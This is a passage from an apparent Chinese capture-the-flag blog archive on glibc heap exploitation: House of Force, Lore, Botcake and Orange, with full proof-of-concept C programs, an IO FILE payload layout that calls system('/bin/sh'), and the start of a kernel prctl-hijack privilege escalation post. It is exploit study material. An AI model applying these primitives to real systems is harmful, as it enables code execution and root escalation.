&lt; obj_size; i++)    object_base[i] = h-&gt;object_base[i];  /* If the object just copied was the only data in OLD_CHUNK,     free that chunk and remove it from the chain.     But not if that chunk might contain an empty object.  */  if (!h-&gt;maybe_empty_object      &amp;&amp; (h-&gt;object_base\t  == __PTR_ALIGN ((char *) old_chunk, old_chunk-&gt;contents,\t\t\t  h-&gt;alignment_mask)))    &#123;      new_chunk-&gt;prev = old_chunk-&gt;prev;      CALL_FREEFUN (h, old_chunk);    &#125;  h-&gt;object_base = object_base;  h-&gt;next_free = h-&gt;object_base + obj_size;  /* The new chunk certainly contains no empty object yet.  */  h-&gt;maybe_empty_object = 0;&#125;\n\n这里又可以看到我们熟悉的宏CALL_CHUNKFUN:\n# define CALL_CHUNKFUN(h, size) \\  (((h)-&gt;use_extra_arg)\t\t\t\t\t\t\t      \\   ? (*(h)-&gt;chunkfun)((h)-&gt;extra_arg, (size))\t\t\t\t      \\   : (*(struct _obstack_chunk *(*)(long))(h)-&gt;chunkfun)((size)))\n\n当(h)-&gt;use_extra_arg不为0时即可执行到(h)-&gt;chunkfun。现在就是整条链子的调用了。\n总结这里没有一点一点分析每个if语句应该怎么写，这里直接给出总的就行。\n*(A + 0x20) = 0;*(A + 0x28) = A + 0x119;*(A + 0x30) = A + 0x119;*(A + 0xd8) = _IO_printf_buffer_as_file_jumps;*(A + 0xe0) = A + 0xe8;*(A + 0xe8) = 0;*(A + 0xf0) = 0;*(A + 0xf8) = A + 0x119;*(A + 0x108) = 11;*(A + 0x110) = A + 0x110;*(A + 0x128) = 0;*(A + 0x130) = 0;*(A + 0x148) = &amp;system;*(A + 0x158) = &amp;bin_sh;*(A + 0x160) = 1;\n\n参考链接​    https://mp.weixin.qq.com/s?__biz=Mzg4MjcxMTAwMQ==&amp;mid=2247486227&amp;idx=1&amp;sn=3ee610ce260b4a381bd0bcf202a34dec&amp;chksm=cf53cba5f82442b3f750ea969f480f9851793006f9223b04db9c5f7ad67c08a9f8db2661bed3&amp;mpshare=1&amp;scene=23&amp;srcid=03222uDWnBlUHhXPTbaEqKrs&amp;sharer_sharetime=1679449533105&amp;sharer_shareid=6eea79ff6da57fc6752ab0bc570bf392%23rd\n","categories":["pwn"],"tags":["house of 系列"]},{"title":"house of ******","url":"/2022/03/03/house-of/","content":"没错！标题的星号就是脏字！\nhouse of force这个堆利用的方式是控制top chunk，把top chunk跑到任意位置。\n总所周知，在malloc的时候发现bin当中没有合适size的chunk的时候就去会割top chunk，那么是怎么隔的就看一下源码\nvictim = av-&gt;top;size = chunksize (victim);if ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE))&#123;    remainder_size = size - nb;    remainder = chunk_at_offset (victim, nb);    av-&gt;top = remainder;    set_head (victim, nb | PREV_INUSE |              (av != &amp;main_arena ? NON_MAIN_ARENA : 0));    set_head (remainder, remainder_size | PREV_INUSE);    check_malloced_chunk (av, victim, nb);    void *p = chunk2mem (victim);    alloc_perturb (p, bytes);    return p;&#125;\n\n#define chunk_at_offset(p, s)  ((mchunkptr) (((char *) (p)) + (s)))\n\n通过上面两个片段就很好可以看出来，只要我们top chunk的size大于我们申请的就会进入内部，然后注意remainder = chunk_at_offset (victim, nb);也就是当前的top chunk的地址加上申请的size，下面av-&gt;top = remainder;将地址赋值给top chunk，不过这里的问题则是如果我们后面给到一个负值，那么我们的top chunk就可以跑到任意地方了。所以来看看how2heap的poc：\n/*   This PoC works also with ASLR enabled.   It will overwrite a GOT entry so in order to apply exactly this technique RELRO must be disabled.   If RELRO is enabled you can always try to return a chunk on the stack as proposed in Malloc Des Maleficarum    ( http://phrack.org/issues/66/10.html )   Tested in Ubuntu 14.04, 64bit, Ubuntu 18.04*/#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;#include &lt;malloc.h&gt;#include &lt;assert.h&gt;char bss_var[] = &quot;This is a string that we want to overwrite.&quot;;int main(int argc , char* argv[])&#123;\tfprintf(stderr, &quot;\\nWelcome to the House of Force\\n\\n&quot;);\tfprintf(stderr, &quot;The idea of House of Force is to overwrite the top chunk and let the malloc return an arbitrary value.\\n&quot;);\tfprintf(stderr, &quot;The top chunk is a special chunk. Is the last in memory &quot;\t\t&quot;and is the chunk that will be resized when malloc asks for more space from the os.\\n&quot;);\tfprintf(stderr, &quot;\\nIn the end, we will use this to overwrite a variable at %p.\\n&quot;, bss_var);\tfprintf(stderr, &quot;Its current value is: %s\\n&quot;, bss_var);\tfprintf(stderr, &quot;\\nLet&#x27;s allocate the first chunk, taking space from the wilderness.\\n&quot;);\tintptr_t *p1 = malloc(256);\tfprintf(stderr, &quot;The chunk of 256 bytes has been allocated at %p.\\n&quot;, p1 - 2);\tfprintf(stderr, &quot;\\nNow the heap is composed of two chunks: the one we allocated and the top chunk/wilderness.\\n&quot;);\tint real_size = malloc_usable_size(p1);\tfprintf(stderr, &quot;Real size (aligned and all that jazz) of our allocated chunk is %ld.\\n&quot;, real_size + sizeof(long)*2);\tfprintf(stderr, &quot;\\nNow let&#x27;s emulate a vulnerability that can overwrite the header of the Top Chunk\\n&quot;);\t//----- VULNERABILITY ----\tintptr_t *ptr_top = (intptr_t *) ((char *)p1 + real_size - sizeof(long));\tfprintf(stderr, &quot;\\nThe top chunk starts at %p\\n&quot;, ptr_top);\tfprintf(stderr, &quot;\\nOverwriting the top chunk size with a big value so we can ensure that the malloc will never call mmap.\\n&quot;);\tfprintf(stderr, &quot;Old size of top chunk %#llx\\n&quot;, *((unsigned long long int *)((char *)ptr_top + sizeof(long))));\t*(intptr_t *)((char *)ptr_top + sizeof(long)) = -1;\tfprintf(stderr, &quot;New size of top chunk %#llx\\n&quot;, *((unsigned long long int *)((char *)ptr_top + sizeof(long))));\t//------------------------\tfprintf(stderr, &quot;\\nThe size of the wilderness is now gigantic. We can allocate anything without malloc() calling mmap.\\n&quot;\t   &quot;Next, we will allocate a chunk that will get us right up against the desired region (with an integer\\n&quot;\t   &quot;overflow) and will then be able to allocate a chunk right over the desired region.\\n&quot;);\t/*\t * The evil_size is calulcated as (nb is the number of bytes requested + space for metadata):\t * new_top = old_top + nb\t * nb = new_top - old_top\t * req + 2sizeof(long) = new_top - old_top\t * req = new_top - old_top - 2sizeof(long)\t * req = dest - 2sizeof(long) - old_top - 2sizeof(long)\t * req = dest - old_top - 4*sizeof(long)\t */\tunsigned long evil_size = (unsigned long)bss_var - sizeof(long)*4 - (unsigned long)ptr_top;\tfprintf(stderr, &quot;\\nThe value we want to write to at %p, and the top chunk is at %p, so accounting for the header size,\\n&quot;\t   &quot;we will malloc %#lx bytes.\\n&quot;, bss_var, ptr_top, evil_size);\tvoid *new_ptr = malloc(evil_size);\tfprintf(stderr, &quot;As expected, the new pointer is at the same place as the old top chunk: %p\\n&quot;, new_ptr - sizeof(long)*2);\tvoid* ctr_chunk = malloc(100);\tfprintf(stderr, &quot;\\nNow, the next chunk we overwrite will point at our target buffer.\\n&quot;);\tfprintf(stderr, &quot;malloc(100) =&gt; %p!\\n&quot;, ctr_chunk);\tfprintf(stderr, &quot;Now, we can finally overwrite that value:\\n&quot;);\tfprintf(stderr, &quot;... old string: %s\\n&quot;, bss_var);\tfprintf(stderr, &quot;... doing strcpy overwrite with \\&quot;YEAH!!!\\&quot;...\\n&quot;);\tstrcpy(ctr_chunk, &quot;YEAH!!!&quot;);\tfprintf(stderr, &quot;... new string: %s\\n&quot;, bss_var);\tassert(ctr_chunk == bss_var);\t// some further discussion:\t//fprintf(stderr, &quot;This controlled malloc will be called with a size parameter of evil_size = malloc_got_address - 8 - p2_guessed\\n\\n&quot;);\t//fprintf(stderr, &quot;This because the main_arena-&gt;top pointer is setted to current av-&gt;top + malloc_size &quot;\t//\t&quot;and we \\nwant to set this result to the address of malloc_got_address-8\\n\\n&quot;);\t//fprintf(stderr, &quot;In order to do this we have malloc_got_address-8 = p2_guessed + evil_size\\n\\n&quot;);\t//fprintf(stderr, &quot;The av-&gt;top after this big malloc will be setted in this way to malloc_got_address-8\\n\\n&quot;);\t//fprintf(stderr, &quot;After that a new call to malloc will return av-&gt;top+8 ( +8 bytes for the header ),&quot;\t//\t&quot;\\nand basically return a chunk at (malloc_got_address-8)+8 = malloc_got_address\\n\\n&quot;);\t//fprintf(stderr, &quot;The large chunk with evil_size has been allocated here 0x%08x\\n&quot;,p2);\t//fprintf(stderr, &quot;The main_arena value av-&gt;top has been setted to malloc_got_address-8=0x%08x\\n&quot;,malloc_got_address);\t//fprintf(stderr, &quot;This last malloc will be served from the remainder code and will return the av-&gt;top+8 injected before\\n&quot;);&#125;\n\n上面的poc很清楚了，可以下去-g调一下。\nif (__glibc_unlikely (size &gt; av-&gt;system_mem))    malloc_printerr (&quot;malloc(): corrupted top size&quot;);\n\n以上片段是在glibc2.29当中新加的导致无法进行此种方法了。\nhouse of loraGlibc2.23这个攻击方式是针对small bin的攻击，先看源码：\nif (in_smallbin_range (nb))&#123;    idx = smallbin_index (nb);    bin = bin_at (av, idx);    if ((victim = last (bin)) != bin)    &#123;        if (victim == 0) /* initialization check */            malloc_consolidate (av);        else        &#123;            bck = victim-&gt;bk;            if (__glibc_unlikely (bck-&gt;fd != victim))            &#123;                errstr = &quot;malloc(): smallbin double linked list corrupted&quot;;                goto errout;            &#125;            set_inuse_bit_at_offset (victim, nb);            bin-&gt;bk = bck;            bck-&gt;fd = bin;            if (av != &amp;main_arena)                victim-&gt;size |= NON_MAIN_ARENA;            check_malloced_chunk (av, victim, nb);            void *p = chunk2mem (victim);            alloc_perturb (p, bytes);            return p;        &#125;    &#125;&#125;\n\n可以看到上面的操作是将最后一个chunk的bk赋值给bck，然后再把bin-&gt;bk=bck就把这个small bin chunk加入到了small bin中去了，不过需要绕过bck-&gt;fd!=victim，这里给出poc：\n/*Advanced exploitation of the House of Lore - Malloc Maleficarum.This PoC take care also of the glibc hardening of smallbin corruption.[ ... ]else    &#123;      bck = victim-&gt;bk;    if (__glibc_unlikely (bck-&gt;fd != victim))&#123;                  errstr = &quot;malloc(): smallbin double linked list corrupted&quot;;                  goto errout;                &#125;       set_inuse_bit_at_offset (victim, nb);       bin-&gt;bk = bck;       bck-&gt;fd = bin;       [ ... ]*/#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;#include &lt;assert.h&gt;void jackpot()&#123; fprintf(stderr, &quot;Nice jump d00d\\n&quot;); exit(0); &#125;int main(int argc, char * argv[])&#123;  intptr_t* stack_buffer_1[4] = &#123;0&#125;;  intptr_t* stack_buffer_2[3] = &#123;0&#125;;  fprintf(stderr, &quot;\\nWelcome to the House of Lore\\n&quot;);  fprintf(stderr, &quot;This is a revisited version that bypass also the hardening check introduced by glibc malloc\\n&quot;);  fprintf(stderr, &quot;This is tested against Ubuntu 16.04.6 - 64bit - glibc-2.23\\n\\n&quot;);  fprintf(stderr, &quot;Allocating the victim chunk\\n&quot;);  intptr_t *victim = malloc(0x100);  fprintf(stderr, &quot;Allocated the first small chunk on the heap at %p\\n&quot;, victim);  // victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk  intptr_t *victim_chunk = victim-2;  fprintf(stderr, &quot;stack_buffer_1 at %p\\n&quot;, (void*)stack_buffer_1);  fprintf(stderr, &quot;stack_buffer_2 at %p\\n&quot;, (void*)stack_buffer_2);  fprintf(stderr, &quot;Create a fake chunk on the stack\\n&quot;);  fprintf(stderr, &quot;Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted&quot;         &quot;in second to the last malloc, which putting stack address on smallbin list\\n&quot;);  stack_buffer_1[0] = 0;  stack_buffer_1[1] = 0;  stack_buffer_1[2] = victim_chunk;  fprintf(stderr, &quot;Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 &quot;         &quot;in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake &quot;         &quot;chunk on stack&quot;);  stack_buffer_1[3] = (intptr_t*)stack_buffer_2;  stack_buffer_2[2] = (intptr_t*)stack_buffer_1;    fprintf(stderr, &quot;Allocating another large chunk in order to avoid consolidating the top chunk with&quot;         &quot;the small one during the free()\\n&quot;);  void *p5 = malloc(1000);  fprintf(stderr, &quot;Allocated the large chunk on the heap at %p\\n&quot;, p5);  fprintf(stderr, &quot;Freeing the chunk %p, it will be inserted in the unsorted bin\\n&quot;, victim);  free((void*)victim);  fprintf(stderr, &quot;\\nIn the unsorted bin the victim&#x27;s fwd and bk pointers are nil\\n&quot;);  fprintf(stderr, &quot;victim-&gt;fwd: %p\\n&quot;, (void *)victim[0]);  fprintf(stderr, &quot;victim-&gt;bk: %p\\n\\n&quot;, (void *)victim[1]);  fprintf(stderr, &quot;Now performing a malloc that can&#x27;t be handled by the UnsortedBin, nor the small bin\\n&quot;);  fprintf(stderr, &quot;This means that the chunk %p will be inserted in front of the SmallBin\\n&quot;, victim);  void *p2 = malloc(1200);  fprintf(stderr, &quot;The chunk that can&#x27;t be handled by the unsorted bin, nor the SmallBin has been allocated to %p\\n&quot;, p2);  fprintf(stderr, &quot;The victim chunk has been sorted and its fwd and bk pointers updated\\n&quot;);  fprintf(stderr, &quot;victim-&gt;fwd: %p\\n&quot;, (void *)victim[0]);  fprintf(stderr, &quot;victim-&gt;bk: %p\\n\\n&quot;, (void *)victim[1]);  //------------VULNERABILITY-----------  fprintf(stderr, &quot;Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\\n&quot;);  victim[1] = (intptr_t)stack_buffer_1; // victim-&gt;bk is pointing to stack  //------------------------------------  fprintf(stderr, &quot;Now allocating a chunk with size equal to the first one freed\\n&quot;);  fprintf(stderr, &quot;This should return the overwritten victim chunk and set the bin-&gt;bk to the injected victim-&gt;bk pointer\\n&quot;);  void *p3 = malloc(0x100);  fprintf(stderr, &quot;This last malloc should trick the glibc malloc to return a chunk at the position injected in bin-&gt;bk\\n&quot;);  char *p4 = malloc(0x100);  fprintf(stderr, &quot;p4 = malloc(0x100)\\n&quot;);  fprintf(stderr, &quot;\\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\\n&quot;,         stack_buffer_2[2]);  fprintf(stderr, &quot;\\np4 is %p and should be on the stack!\\n&quot;, p4); // this chunk will be allocated on stack  intptr_t sc = (intptr_t)jackpot; // Emulating our in-memory shellcode  memcpy((p4+40), &amp;sc, 8); // This bypasses stack-smash detection since it jumps over the canary  // sanity check  assert((long)__builtin_return_address(0) == (long)jackpot);&#125;\n\n一样的上面的poc确实写的非常详细，自己下去调\nGlibc 2.27后此时就出现了tcache，存在了前几天的机制：\nif (in_smallbin_range (nb))&#123;    idx = smallbin_index (nb);    bin = bin_at (av, idx);    if ((victim = last (bin)) != bin)    &#123;        bck = victim-&gt;bk;        if (__glibc_unlikely (bck-&gt;fd != victim))            malloc_printerr (&quot;malloc(): smallbin double linked list corrupted&quot;);        set_inuse_bit_at_offset (victim, nb);        bin-&gt;bk = bck;        bck-&gt;fd = bin;        if (av != &amp;main_arena)            set_non_main_arena (victim);        check_malloced_chunk (av, victim, nb);        #if USE_TCACHE        /* While we&#x27;re here, if we see other chunks of the same size,\t     stash them in the tcache.  */        size_t tc_idx = csize2tidx (nb);        if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)        &#123;            mchunkptr tc_victim;            /* While bin not empty and tcache not full, copy chunks over.  */            while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count                   &amp;&amp; (tc_victim = last (bin)) != bin)            &#123;                if (tc_victim != 0)                &#123;                    bck = tc_victim-&gt;bk;                    set_inuse_bit_at_offset (tc_victim, nb);                    if (av != &amp;main_arena)                        set_non_main_arena (tc_victim);                    bin-&gt;bk = bck;                    bck-&gt;fd = bin;                    tcache_put (tc_victim, tc_idx);                &#125;            &#125;        &#125;        #endif        void *p = chunk2mem (victim);        alloc_perturb (p, bytes);        return p;    &#125;&#125;\n\n当我们把chunk放进了small bin就会马上进入到tcache内，并且还是个while循环，所以其实有了tcache之后这个就很难利用了，但是依旧是可以利用：\n/*Advanced exploitation of the House of Lore - Malloc Maleficarum.This PoC take care also of the glibc hardening of smallbin corruption.[ ... ]else    &#123;      bck = victim-&gt;bk;    if (__glibc_unlikely (bck-&gt;fd != victim))&#123;                  errstr = &quot;malloc(): smallbin double linked list corrupted&quot;;                  goto errout;                &#125;       set_inuse_bit_at_offset (victim, nb);       bin-&gt;bk = bck;       bck-&gt;fd = bin;       [ ... ]*/#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;#include &lt;assert.h&gt;void jackpot()&#123; fprintf(stderr, &quot;Nice jump d00d\\n&quot;); exit(0); &#125;int main(int argc, char * argv[])&#123;  intptr_t* stack_buffer_1[4] = &#123;0&#125;;  intptr_t* stack_buffer_2[3] = &#123;0&#125;;  void* fake_freelist[7][4];  fprintf(stderr, &quot;\\nWelcome to the House of Lore\\n&quot;);  fprintf(stderr, &quot;This is a revisited version that bypass also the hardening check introduced by glibc malloc\\n&quot;);  fprintf(stderr, &quot;This is tested against Ubuntu 20.04.2 - 64bit - glibc-2.31\\n\\n&quot;);  fprintf(stderr, &quot;Allocating the victim chunk\\n&quot;);  intptr_t *victim = malloc(0x100);  fprintf(stderr, &quot;Allocated the first small chunk on the heap at %p\\n&quot;, victim);  fprintf(stderr, &quot;Allocating dummy chunks for using up tcache later\\n&quot;);  void *dummies[7];  for(int i=0; i&lt;7; i++) dummies[i] = malloc(0x100);  // victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk  intptr_t *victim_chunk = victim-2;  fprintf(stderr, &quot;stack_buffer_1 at %p\\n&quot;, (void*)stack_buffer_1);  fprintf(stderr, &quot;stack_buffer_2 at %p\\n&quot;, (void*)stack_buffer_2);  fprintf(stderr, &quot;Create a fake free-list on the stack\\n&quot;);  for(int i=0; i&lt;6; i++) &#123;    fake_freelist[i][3] = fake_freelist[i+1];  &#125;  fake_freelist[6][3] = NULL;  fprintf(stderr, &quot;fake free-list at %p\\n&quot;, fake_freelist);  fprintf(stderr, &quot;Create a fake chunk on the stack\\n&quot;);  fprintf(stderr, &quot;Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted&quot;         &quot;in second to the last malloc, which putting stack address on smallbin list\\n&quot;);  stack_buffer_1[0] = 0;  stack_buffer_1[1] = 0;  stack_buffer_1[2] = victim_chunk;  fprintf(stderr, &quot;Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 &quot;         &quot;in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake &quot;         &quot;chunk on stack&quot;);  stack_buffer_1[3] = (intptr_t*)stack_buffer_2;  stack_buffer_2[2] = (intptr_t*)stack_buffer_1;  fprintf(stderr, &quot;Set the bck pointer of stack_buffer_2 to the fake free-list in order to prevent crash prevent crash &quot;          &quot;introduced by smallbin-to-tcache mechanism\\n&quot;);  stack_buffer_2[3] = (intptr_t *)fake_freelist[0];    fprintf(stderr, &quot;Allocating another large chunk in order to avoid consolidating the top chunk with&quot;         &quot;the small one during the free()\\n&quot;);  void *p5 = malloc(1000);  fprintf(stderr, &quot;Allocated the large chunk on the heap at %p\\n&quot;, p5);  fprintf(stderr, &quot;Freeing dummy chunk\\n&quot;);  for(int i=0; i&lt;7; i++) free(dummies[i]);  fprintf(stderr, &quot;Freeing the chunk %p, it will be inserted in the unsorted bin\\n&quot;, victim);  free((void*)victim);  fprintf(stderr, &quot;\\nIn the unsorted bin the victim&#x27;s fwd and bk pointers are nil\\n&quot;);  fprintf(stderr, &quot;victim-&gt;fwd: %p\\n&quot;, (void *)victim[0]);  fprintf(stderr, &quot;victim-&gt;bk: %p\\n\\n&quot;, (void *)victim[1]);  fprintf(stderr, &quot;Now performing a malloc that can&#x27;t be handled by the UnsortedBin, nor the small bin\\n&quot;);  fprintf(stderr, &quot;This means that the chunk %p will be inserted in front of the SmallBin\\n&quot;, victim);  void *p2 = malloc(1200);  fprintf(stderr, &quot;The chunk that can&#x27;t be handled by the unsorted bin, nor the SmallBin has been allocated to %p\\n&quot;, p2);  fprintf(stderr, &quot;The victim chunk has been sorted and its fwd and bk pointers updated\\n&quot;);  fprintf(stderr, &quot;victim-&gt;fwd: %p\\n&quot;, (void *)victim[0]);  fprintf(stderr, &quot;victim-&gt;bk: %p\\n\\n&quot;, (void *)victim[1]);  //------------VULNERABILITY-----------  fprintf(stderr, &quot;Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\\n&quot;);  victim[1] = (intptr_t)stack_buffer_1; // victim-&gt;bk is pointing to stack  //------------------------------------  fprintf(stderr, &quot;Now take all dummies chunk in tcache out\\n&quot;);  for(int i=0; i&lt;7; i++) malloc(0x100);  fprintf(stderr, &quot;Now allocating a chunk with size equal to the first one freed\\n&quot;);  fprintf(stderr, &quot;This should return the overwritten victim chunk and set the bin-&gt;bk to the injected victim-&gt;bk pointer\\n&quot;);  void *p3 = malloc(0x100);  fprintf(stderr, &quot;This last malloc should trick the glibc malloc to return a chunk at the position injected in bin-&gt;bk\\n&quot;);  char *p4 = malloc(0x100);  fprintf(stderr, &quot;p4 = malloc(0x100)\\n&quot;);  fprintf(stderr, &quot;\\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\\n&quot;,         stack_buffer_2[2]);  fprintf(stderr, &quot;\\np4 is %p and should be on the stack!\\n&quot;, p4); // this chunk will be allocated on stack  intptr_t sc = (intptr_t)jackpot; // Emulating our in-memory shellcode  long offset = (long)__builtin_frame_address(0) - (long)p4;  memcpy((p4+offset+8), &amp;sc, 8); // This bypasses stack-smash detection since it jumps over the canary  // sanity check  assert((long)__builtin_return_address(0) == (long)jackpot);&#125;\n\n可以看到，他这里是创建了一个假的fake_freelist，这个的作用就是到最后while循环时，将所有内容放入到tcache中，不然会引起崩溃\n\nhouse of botcake在glibc2.27里的tcache是什么验证都没加\nif (tcache    &amp;&amp; tc_idx &lt; mp_.tcache_bins    &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)&#123;    tcache_put (p, tc_idx);    return;&#125;\n\n所以可以很轻易的double free，但是在glibc2.29之后就不一样了：\nif (__glibc_unlikely (e-&gt;key == tcache))&#123;    tcache_entry *tmp;    LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx);    for (tmp = tcache-&gt;entries[tc_idx];         tmp;         tmp = tmp-&gt;next)        if (tmp == e)            malloc_printerr (&quot;free(): double free detected in tcache 2&quot;);    /* If we get here, it was a coincidence.  We&#x27;ve wasted a\t       few cycles, but don&#x27;t abort.  */&#125;if (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)&#123;    tcache_put (p, tc_idx);    return;&#125;\n\n但是一样有办法可以让tcache存在我们指定地址的fake chunk，下面看poc：\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdint.h&gt;#include &lt;assert.h&gt;int main()&#123;    /*     * This attack should bypass the restriction introduced in     * https://sourceware.org/git/?p=glibc.git;a=commit;h=bcdaad21d4635931d1bd3b54a7894276925d081d     * If the libc does not include the restriction, you can simply double free the victim and do a     * simple tcache poisoning     * And thanks to @anton00b and @subwire for the weird name of this technique */    // disable buffering so _IO_FILE does not interfere with our heap    setbuf(stdin, NULL);    setbuf(stdout, NULL);    // introduction    puts(&quot;This file demonstrates a powerful tcache poisoning attack by tricking malloc into&quot;);    puts(&quot;returning a pointer to an arbitrary location (in this demo, the stack).&quot;);    puts(&quot;This attack only relies on double free.\\n&quot;);    // prepare the target    intptr_t stack_var[4];    puts(&quot;The address we want malloc() to return, namely,&quot;);    printf(&quot;the target address is %p.\\n\\n&quot;, stack_var);    // prepare heap layout    puts(&quot;Preparing heap layout&quot;);    puts(&quot;Allocating 7 chunks(malloc(0x100)) for us to fill up tcache list later.&quot;);    intptr_t *x[7];    for(int i=0; i&lt;sizeof(x)/sizeof(intptr_t*); i++)&#123;        x[i] = malloc(0x100);    &#125;    puts(&quot;Allocating a chunk for later consolidation&quot;);    intptr_t *prev = malloc(0x100);    puts(&quot;Allocating the victim chunk.&quot;);    intptr_t *a = malloc(0x100);    printf(&quot;malloc(0x100): a=%p.\\n&quot;, a);     puts(&quot;Allocating a padding to prevent consolidation.\\n&quot;);    malloc(0x10);        // cause chunk overlapping    puts(&quot;Now we are able to cause chunk overlapping&quot;);    puts(&quot;Step 1: fill up tcache list&quot;);    for(int i=0; i&lt;7; i++)&#123;        free(x[i]);    &#125;    puts(&quot;Step 2: free the victim chunk so it will be added to unsorted bin&quot;);    free(a);        puts(&quot;Step 3: free the previous chunk and make it consolidate with the victim chunk.&quot;);    free(prev);        puts(&quot;Step 4: add the victim chunk to tcache list by taking one out from it and free victim again\\n&quot;);    malloc(0x100);    /*VULNERABILITY*/    free(a);// a is already freed    /*VULNERABILITY*/        // simple tcache poisoning    puts(&quot;Launch tcache poisoning&quot;);    puts(&quot;Now the victim is contained in a larger freed chunk, we can do a simple tcache poisoning by using overlapped chunk&quot;);    intptr_t *b = malloc(0x120);    puts(&quot;We simply overwrite victim&#x27;s fwd pointer&quot;);    b[0x120/8-2] = (long)stack_var;        // take target out    puts(&quot;Now we can cash out the target chunk.&quot;);    malloc(0x100);    intptr_t *c = malloc(0x100);    printf(&quot;The new chunk is at %p\\n&quot;, c);        // sanity check    assert(c==stack_var);    printf(&quot;Got control on target/stack!\\n\\n&quot;);        // note    puts(&quot;Note:&quot;);    puts(&quot;And the wonderful thing about this exploitation is that: you can free b, victim again and modify the fwd pointer of victim&quot;);    puts(&quot;In that case, once you have done this exploitation, you can have many arbitary writes very easily.&quot;);    return 0;&#125;\n\n其实很简单，也是利用了double free不过第一次free是将a丢进了unsorted bin当中，然后第二次free将a丢进了tcache，然后利用unsorted bin当中的chunk去修改tcache中的fd指针。\nhouse of orange这一攻击手法只是用于glibc2.27及一下，因为其中存在unsorted bin attack\n其实这一攻击手法也是非常简单，主要适用于程序当中不存在free的时候形成一个unsorted bin chunk然后经过unsorted bin attack进行FSOP\n因为涉及到的源码过多我这里只贴部分就行：\nif (av == NULL    || ((unsigned long) (nb) &gt;= (unsigned long) (mp_.mmap_threshold)        &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max)))&#123;    char *mm;           /* return value from mmap call*/    try_mmap:\n\n首先我们肯定是不想进行mmap来新增堆空间的，所以我们不能大于他的阀值(0x2000)，其次我们如果要扩展top chunk需要绕过这几条判断：\n/* Record incoming configuration of top */old_top = av-&gt;top;old_size = chunksize (old_top);old_end = (char *) (chunk_at_offset (old_top, old_size));brk = snd_brk = (char *) (MORECORE_FAILURE);/*     If not the first time through, we require old_size to be     at least MINSIZE and to have prev_inuse set.   */assert ((old_top == initial_top (av) &amp;&amp; old_size == 0) ||        ((unsigned long) (old_size) &gt;= MINSIZE &amp;&amp;         prev_inuse (old_top) &amp;&amp;         ((unsigned long) old_end &amp; (pagesize - 1)) == 0));/* Precondition: not enough current space to satisfy nb request */assert ((unsigned long) (old_size) &lt; (unsigned long) (nb + MINSIZE));\n\n可以看到存在两个assert，第一个assert我们很好绕过，只需要保留top chunk的后三位即可保留，第二个则是我们申请的size大于top chunk的size。\n因为没找到poc我就自己写了一个，其实也是很简单的，很好就可以想到：\n#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;#include &lt;malloc.h&gt;int main()&#123;    intptr_t *fp;    fp = malloc(0x10);    intptr_t *top;    top = fp + 2;    fprintf(stderr, &quot;the top chunk starts at %p;\\n&quot;, top);    fprintf(stderr, &quot;the size of top chunk is %#lx;\\n&quot;, *(top + 1));    *(top + 1) = 0xd91;    malloc(0x1000);    fprintf(stderr, &quot;Now,the top chunk is inserted the unsorted bin\\n&quot;);&#125;\n\n\n参考链接https://github.com/shellphish/how2heap\nhttps://www.anquanke.com/post/id/218887\n","categories":["pwn"],"tags":["house of 系列","house of force","house of lora","house of botcake","house of orange"]},{"title":"kernel pwn内存任意读写提升权限[2]","url":"/2022/08/04/kernel-pwn%E5%86%85%E5%AD%98%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%86%99%E6%8F%90%E5%8D%87%E6%9D%83%E9%99%90-2/","content":"这次的例题是solid_core，题目的整体和前面那一道stringipc几乎一样\ncase 0x77617369:    if ( copy_from_user(&amp;v27, a3, 24LL) )        return -22LL;    v5 = v3 + 1;    mutex_lock(v3 + 1);    v16 = *v3;    v7 = v29;    if ( !*v3 )        goto LABEL_39;    v17 = *((_QWORD *)v16 + 3);    if ( (unsigned __int64)(v17 + v29) &gt; *((_QWORD *)v16 + 2) )        goto LABEL_25;    v18 = *((_QWORD *)v16 + 1) + v17;    if ( v18 &lt;= 0xFFFFFFFF7FFFFFFFLL )    &#123;        printk(&amp;unk_779, v28);    &#125;    else if ( strncpy_from_user(v18, v28, v29) &gt;= 0 )    &#123;        goto LABEL_19;    &#125;    goto LABEL_25;\n\n但是在写内容的这个地方和那一道题有些许不同，这里禁止往0xFFFFFFFF80000000之前的地址写入了，这也就导致昨天的两种利用方式无法使用了。\n原理分析Prctl是linux的一个函数，可以对进程、线程做一些设置，prctl内部通过虚表来调用对应的功能，如果我们劫持prctl的虚表，使它指向其他对我们有帮助的内核函数，比如call_usermodehelper函数，该函数执行一个用户传入的二进制文件，且以root权限执行，由此可以利用起来提权。\nSYSCALL_DEFINE5(prctl, int, option, unsigned long, arg2, unsigned long, arg3,                unsigned long, arg4, unsigned long, arg5)&#123;    struct task_struct *me = current;    unsigned char comm[sizeof(me-&gt;comm)];    long error;    error = security_task_prctl(option, arg2, arg3, arg4, arg5);    if (error != -ENOSYS)        return error;    